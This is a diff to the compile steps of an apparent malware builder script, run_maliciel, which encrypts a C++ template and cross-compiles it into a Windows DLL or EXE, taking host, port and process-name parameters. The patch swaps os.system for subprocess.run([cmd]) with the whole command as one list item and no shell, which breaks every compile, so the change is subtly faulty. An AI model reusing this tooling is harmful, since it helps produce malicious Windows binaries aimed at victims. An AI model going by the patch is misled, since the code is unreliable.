@@ -209,10 +209,11 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
 
         print (Colors.BLUE + "compiling..." + Colors.ENDC)
         try:
-            cmd = "x86_64-w64-mingw32-g++ -shared -o maliciel.dll maliciel-enc.cpp -fpermissive >/dev/null 2>&1"
-            os.system(cmd)
+            cmd = "x86_64-w64-mingw32-g++ -shared -o maliciel.dll maliciel-enc.cpp -fpermissive >/dev/null"
+            subprocess.run([cmd], check = True)
             os.remove("maliciel-enc.cpp")
         except:
+            os.remove("maliciel-enc.cpp")
             print (Colors.RED + "error compiling template :(" + Colors.ENDC)
             sys.exit()
         else:
@@ -282,10 +283,11 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
         print (Colors.GREEN + "successfully encrypt template file :)" + Colors.ENDC)
         print (Colors.BLUE + "compiling..." + Colors.ENDC)
         try:
-            cmd = "x86_64-w64-mingw32-gcc -O2 maliciel-enc.cpp -o maliciel.exe -m" + mode + " -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1"
-            os.system(cmd)
+            cmd = "x86_64-w64-mingw32-gcc -O2 maliciel-enc.cpp -o maliciel.exe -m" + mode + " -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null"
+            subprocess.run([cmd], check = True)
             os.remove("maliciel-enc.cpp")
         except:
+            os.remove("maliciel-enc.cpp")
             print (Colors.RED + "error compiling template :(" + Colors.ENDC)
             sys.exit()
         else:
@@ -365,10 +367,11 @@ def run_maliciel(host, port, build, encryption, proc_name, mode):
 
         print (Colors.BLUE + "compiling..." + Colors.ENDC)
         try:
-            cmd = "x86_64-w64-mingw32-g++ -O2 maliciel-enc.cpp -o maliciel.exe -m" + mode + " -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1"
-            os.system(cmd)
+            cmd = "x86_64-w64-mingw32-g++ -O2 maliciel-enc.cpp -o maliciel.exe -m" + mode + " -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null"
+            subprocess.run([cmd], check = True)
             os.remove("maliciel-enc.cpp")
         except:
+            os.remove("maliciel-enc.cpp")
             print (Colors.RED + "error compiling template :(" + Colors.ENDC)
             sys.exit()
         else:
